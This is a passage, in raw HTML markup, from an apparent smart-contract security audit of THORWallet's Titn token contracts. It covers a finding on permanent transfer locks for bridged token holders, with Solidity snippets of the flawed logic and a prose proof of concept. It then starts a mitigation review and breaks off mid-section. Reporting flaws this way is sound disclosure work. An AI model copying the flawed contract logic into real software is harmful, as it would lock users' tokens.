events.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"qa-05-permanent-transfer-restrictions-on-bridged-tokens-due-to-immutable-isbridgedtokenholder-mapping\" style=\"position:relative;\"\u003e\u003ca href=\"#qa-05-permanent-transfer-restrictions-on-bridged-tokens-due-to-immutable-isbridgedtokenholder-mapping\" aria-label=\"qa 05 permanent transfer restrictions on bridged tokens due to immutable isbridgedtokenholder mapping permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[QA-05] Permanent transfer restrictions on bridged tokens due to immutable isBridgedTokenHolder mapping\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eImpact\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eHigh. Addresses marked as bridged token holders cannot be unmarked, potentially leading to permanently locked tokens, even in legitimate cases.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eVulnerability Details\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eIn the Titn contract, addresses that receive bridged tokens are permanently marked in the isBridgedTokenHolder mapping with no way to remove them:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003emapping\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_credit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amountLD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ... other logic ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Addresses that bridged tokens have some transfer restrictions\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amountLD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese addresses are then restricted from transferring tokens:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokensTransferLocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echainid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbitrumChainId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elzEndpoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eBridgedTokensTransferLocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis creates several issues:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eNo way to correct mistakenly marked addresses\u003c/li\u003e\n\u003cli\u003eNo way to remove restrictions after legitimate bridging\u003c/li\u003e\n\u003cli\u003eContract upgrades or migrations become complicated\u003c/li\u003e\n\u003cli\u003eUsers who receive bridged tokens are permanently restricted\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"proof-of-concept-6\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eUser A bridges tokens from chain X to Arbitrum.\u003c/li\u003e\n\u003cli\u003eUser A’s address is marked as isBridgedTokenHolder.\u003c/li\u003e\n\u003cli\u003eUser A sends tokens back to chain X.\u003c/li\u003e\n\u003cli\u003eUser A receives new tokens on Arbitrum through legitimate means.\u003c/li\u003e\n\u003cli\u003eUser A cannot transfer these new tokens due to permanent restriction.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd a function to remove addresses from the bridged holders mapping.\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"mitigation-review\" style=\"position:relative;\"\u003e\u003ca href=\"#mitigation-review\" aria-label=\"mitigation review permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e\u003c/h1\u003e\n\u003ch2 id=\"introduction\" style=\"position:relative;\"\u003e\u003ca href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eFollowing the C4 audit, 3 wardens (\u003ca href=\"https://code4rena.com/@web3km\"\u003eweb3km\u003c/a\u003e, \u003ca href=\"https://code4rena.com/@shaflow2\"\u003eshaflow2\u003c/a\u003e and \u003ca href=\"https://code4rena.com/@kn0t\"\u003ekn0t\u003c/a\u003e) reviewed the mitigations for all identified issues. Additional details can be found within the \u003ca href=\"https://github.com/code-423n4/2025-03-thorwallet-mitigation\"\u003eC4 THORWallet Mitigation Review repository\u003c/a\u003e.\u003c/p\u003e\n\u003ch2 id=\"mitigation-review-scope\" style=\"position:relative;\"\u003e\u003ca href=\"#mitigation-review-scope\" aria-label=\"mitigation review scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMitigation Review Scope\u003c/h2\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eURL\u003c/th\u003e\n\u003cth\u003eMitigation of\u003c/th\u003e\n\u003cth\u003ePurpose\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/4\"\u003ehttps://github.com/THORWallet/TGT-TITN-merge-contracts/pull/4\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-9\"\u003eH-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eOnly allow bridging to the sender’s own address\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/2\"\u003ehttps://github.com/THORWallet/TGT-TITN-merge-contracts/pull/2\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-6\"\u003eH-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eFix issue when depositing more TGT and specified in the contract\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/1\"\u003ehttps://github.com/THORWallet/TGT-TITN-merge-contracts/pull/1\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-3\"\u003eADD-01 (F-3)\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eFix issue claiming TITN on day 360\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/3\"\u003ehttps://github.com/THORWallet/TGT-TITN-merge-contracts/pull/3\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-4\"\u003eADD-02 (F-4)\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eDo not allow transfers to the LZ endpoint as it is not needed\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"out-of-scope\" style=\"position:relative;\"\u003e\u003ca href=\"#out-of-scope\" aria-label=\"out of scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOut of Scope\u003c/h3\u003e\n\u003cp\u003eAll sponsor \u003ccode\u003eacknowledged\u003c/code\u003e (wontfix) findings, including:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-7\"\u003eM-01: Improper Transfer Restrictions on Non-Bridged Tokens Due to Boolean Bridged Token Tracking, Allowing a DoS Attack Vector\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"mitigation-review-summary\" style=\"position:relative;\"\u003e\u003ca href=\"#mitigation-review-summary\" aria-label=\"mitigation review summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMitigation Review Summary\u003c/h2\u003e\n\u003cp\u003eDuring the mitigation review, the wardens determined that 4 in-scope findings from the original audit were fully mitigated. They also surfaced one new issue of High severity. The table below provides details regarding the status of each in-scope vulnerability from the original audit, followed by full details on the new issue.\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth align=\"center\"\u003eOriginal Issue\u003c/th\u003e\n\u003cth\u003eStatus\u003c/th\u003e\n\u003cth\u003eFull Details\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-6\"\u003eH-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eMitigation confirmed\u003c/td\u003e\n\u003ctd\u003eReports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-4\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-9\"\u003eweb3km\u003c/a\u003e and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-13\"\u003ekn0t\u003c/a\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-9\"\u003eH-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eMitigation confirmed\u003c/td\u003e\n\u003ctd\u003eReports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-3\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-14\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-12\"\u003ekn0t\u003c/a\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-3\"\u003eADD-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eMitigation confirmed\u003c/td\u003e\n\u003ctd\u003eReports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-2\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-6\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-10\"\u003ekn0t\u003c/a\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-4\"\u003eADD-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003eMitigation confirmed\u003c/td\u003e\n\u003ctd\u003eReports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-1\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-7\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-11\"\u003ekn0t\u003c/a\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003chr\u003e\n\u003ch2 id=\"f-9-unmitigated\" style=\"position:relative;\"\u003e\u003ca href=\"#f-9-unmitigated\" aria-label=\"f 9 unmitigated permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 